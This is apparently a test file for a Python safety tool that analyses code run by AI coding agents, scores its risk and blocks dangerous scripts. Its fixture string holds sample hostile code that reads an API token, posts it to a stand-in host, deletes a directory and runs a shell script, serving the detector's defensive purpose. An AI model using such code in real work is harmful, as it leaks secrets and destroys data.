"""End-to-end checks for the Python surface.

Runs under pytest, and standalone under plain `python3` so the Makefile works
without a test dependency.
"""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pyxray_agent as pyxray

SKETCHY = """
import os, shutil, subprocess
import requests

TOKEN = os.environ["API_TOKEN"]
shutil.rmtree("/tmp/stage", ignore_errors=True)
r = requests.post("https://h/", json={"t": TOKEN})
subprocess.run("bash go.sh", shell=True)
"""


def test_backend_is_available():
    assert pyxray.backend() in ("extension", "binary")


def test_analyze_reports_the_chain():
    report = pyxray.analyze(SKETCHY, "sketchy.py")
    kinds = {hit["effect"] for hit in report["effects"]}
    assert {"env", "fs_delete", "net", "process"} <= kinds, kinds
    assert report["metrics"]["risk"] > 60
    assert "DELETES" in report["meta"]["synopsis"]


def test_broken_source_still_reports():
    report = pyxray.analyze("def f(:\n", "broken.py")
    assert report["meta"]["parsed"] is False
    assert report["diagnostics"]


def test_render_formats_differ_but_all_carry_the_finding():
    for fmt, marker in (("text", "rmtree"), ("html", "<pre"), ("svg", "<svg")):
        out = pyxray.render(SKETCHY, format=fmt, width=100, layout="card")
        assert marker in out, fmt


def test_ansi_render_contains_escapes():
    out = pyxray.render(SKETCHY, format="ansi", width=90)
    assert "\x1b[" in out


def test_every_theme_and_layout_renders():
    for theme, _, _ in pyxray.themes():
        for layout, _ in pyxray.layouts():
            out = pyxray.render(SKETCHY, theme=theme, layout=layout, format="text", width=90)
            assert out.strip()


def test_extract_has_one_implementation():
    cases = [
        ("python3 <<'EOF'\nprint(1)\nEOF\n", "print(1)\n"),
        ('python3 <<"PY"\nx = 2\nPY\n', "x = 2\n"),
        ("python3 <<-END\n\tprint(3)\n\tEND\n", "print(3)\n"),
        ("python3 -c 'print(4)'", "print(4)"),
        ("cd /tmp && env FOO=1 python3 -c 'print(5)' && echo done", "print(5)"),
        ("print('bare')\n", "print('bare')\n"),
    ]
    from pyxray_agent.heredoc import extract_python  # the deprecated forwarder

    for command, expected in cases:
        assert pyxray.extract(command)[0] == expected, command
        assert extract_python(command)[0] == expected, command


def test_interceptor_gate_refuses_and_reports_why():
    env = {**os.environ, "PYXRAY_GATE": "10", "PYXRAY_WIDTH": "80",
           "PYTHONPATH": str(Path(__file__).resolve().parents[1])}
    script = Path(__file__).parent / "_sample.py"
    script.write_bytes(b"import shutil\nshutil.rmtree('/tmp/nope')\n")
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pyxray_agent.intercept", "--", sys.executable, str(script)],
            capture_output=True, text=True, env=env,
        )
        assert proc.returncode == 3, proc.stderr
        assert "refusing to run" in proc.stderr
    finally:
        script.unlink(missing_ok=True)


def test_interceptor_runs_harmless_code():
    env = {**os.environ, "PYXRAY_GATE": "50", "PYXRAY_WIDTH": "80",
           "PYTHONPATH": str(Path(__file__).resolve().parents[1])}
    proc = subprocess.run(
        [sys.executable, "-m", "pyxray_agent.intercept", "--",
         sys.executable, "-c", "print('ran')"],
        capture_output=True, text=True, env=env,
    )
    assert proc.returncode == 0, proc.stderr
    assert "ran" in proc.stdout


def test_hook_finds_python_in_every_harness_shape():
    """The payload shapes the shipped integrations actually produce.

    Tool names are compared case-insensitively: Claude Code says "Bash",
    Hermes says "terminal", and a matcher that cares about the capital B
    ignores every payload silently — the worst failure an observer can have.
    """
    from pyxray_agent.intercept import python_in_payload

    cases = [
        # Claude Code: capitalised tool, heredoc inside a shell command.
        ({"tool_name": "Bash",
          "tool_input": {"command": "python3 <<'EOF'\nimport os\nEOF"}}, "import os"),
        # Hermes: a tool that takes Python directly.
        ({"tool_name": "execute_code",
          "tool_input": {"code": "import shutil\nshutil.rmtree('/x')"}}, "rmtree"),
        # Hermes: its shell tool.
        ({"tool_name": "terminal",
          "tool_input": {"command": "python3 -c 'import sys\nprint(sys.path)'"}}, "import sys"),
        # OpenCode: lowercase bash, argv-shaped.
        ({"tool": "bash", "args": {"command": "python -c \"import json\nprint(1)\""}},
         "import json"),
        # A harness we have never seen, with the code in an odd field.
        ({"tool_name": "mystery_runner", "input": {"script": "import os\nos.remove('x')"}},
         "os.remove"),
    ]
    for payload, needle in cases:
        found = python_in_payload(payload)
        assert found, payload
        assert needle in found[0][0], (payload, found)


def test_hook_ignores_things_that_are_not_python():
    from pyxray_agent.intercept import python_in_payload

    for payload in [
        {"tool_name": "Bash", "tool_input": {"command": "git status"}},
        {"tool_name": "Bash", "tool_input": {"command": "ls -la /tmp"}},
        {"tool_name": "Read", "tool_input": {"file_path": "/etc/hosts"}},
        {"tool_name": "Bash", "tool_input": {}},
        {"tool_name": "Write", "tool_input": {"file_path": "/x", "content": "hello\nworld"}},
        {"tool_name": "Edit", "tool_input": {"old_string": "a = 1", "new_string": "a = 2"}},
        {"tool_name": "mystery", "input": {"content": "a = 1\n"}},
        {"tool_name": "mystery", "input": {"script": "ls -la\ngit status"}},
        {"tool_name": "Bash", "tool_input": {"command": "echo \"python3 -c 'print(1)'\""}},
        {},
    ]:
        assert python_in_payload(payload) == [], payload


def test_gate_off_is_the_default_and_zero_is_not_off():
    import os

    from pyxray_agent.intercept import gate

    saved = os.environ.pop("PYXRAY_GATE", None)
    try:
        assert gate() is None
        for value in ("off", "none", "", "  "):
            os.environ["PYXRAY_GATE"] = value
            assert gate() is None, value
        # 0 reads like "no gate" and means the opposite. That is deliberate,
        # and it is why `off` exists — but 0 must keep meaning what it says.
        os.environ["PYXRAY_GATE"] = "0"
        assert gate() == 0
        os.environ["PYXRAY_GATE"] = "40"
        assert gate() == 40
    finally:
        os.environ.pop("PYXRAY_GATE", None)
        if saved is not None:
            os.environ["PYXRAY_GATE"] = saved


def test_the_feed_records_without_drawing():
    """The default path: one line appended, nothing rendered."""
    import os
    import tempfile

    with tempfile.TemporaryDirectory() as tmp:
        log = os.path.join(tmp, "feed.jsonl")
        saved = os.environ.get("PYXRAY_LOG")
        os.environ["PYXRAY_LOG"] = log
        os.environ["PYXRAY_DRAW"] = "never"
        try:
            from pyxray_agent.intercept import look

            event = look(SKETCHY, "sketchy.py", source="test")
            assert event["risk"] > 60
            assert event["band"] == "read"
            rows = pyxray.feed(log)
            assert len(rows) == 1
            assert rows[0]["source"] == "test"
            assert rows[0]["mask"] > 0
        finally:
            os.environ.pop("PYXRAY_DRAW", None)
            if saved is None:
                os.environ.pop("PYXRAY_LOG", None)
            else:
                os.environ["PYXRAY_LOG"] = saved


if __name__ == "__main__":
    failures = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"ok    {name}")
            except Exception as exc:  # noqa: BLE001 — a crash is a failure too
                failures += 1
                print(f"FAIL  {name}: {exc!r}")
    print(f"\n{failures} failure(s)")
    raise SystemExit(1 if failures else 0)
